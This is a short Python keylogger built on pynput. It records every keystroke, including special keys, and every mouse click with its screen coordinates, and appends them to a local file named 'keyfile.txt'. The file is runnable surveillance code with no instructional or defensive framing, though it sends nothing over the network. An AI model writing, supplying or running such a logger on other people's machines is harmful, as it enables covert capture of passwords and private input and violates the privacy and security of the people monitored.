from pynput import keyboard, mouse

# Global variables
key_count = 0
key_buffer = []

# Function to handle key press events
def keyPressed(key):
    global key_count, key_buffer
    try:
        char = key.char
        key_buffer.append(char)
    except AttributeError:  # Handle special keys
        key_buffer.append(f"[{key}]")

    key_count += 1

    # Write to file when buffer reaches 20 keys
    if key_count >= 20:
        write_to_file()
        key_count = 0
        key_buffer.clear()

# Function to log mouse clicks
def on_click(x, y, button, pressed):
    if pressed:  # Log only when the mouse is clicked
        with open("keyfile.txt", 'a') as logMouse:
            logMouse.write(f"Mouse clicked at ({x}, {y}) with {button.name} button\n")

# Function to write keys to file
def write_to_file():
    with open("keyfile.txt", 'a') as logKey:
        logKey.write(" ".join(key_buffer) + "\n")

# Main execution
if __name__ == "__main__":
    # Start keyboard listener
    key_listener = keyboard.Listener(on_press=keyPressed)
    key_listener.start()

    # Start mouse listener
    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()

    # Keep the program running
    key_listener.join()
    mouse_listener.join()
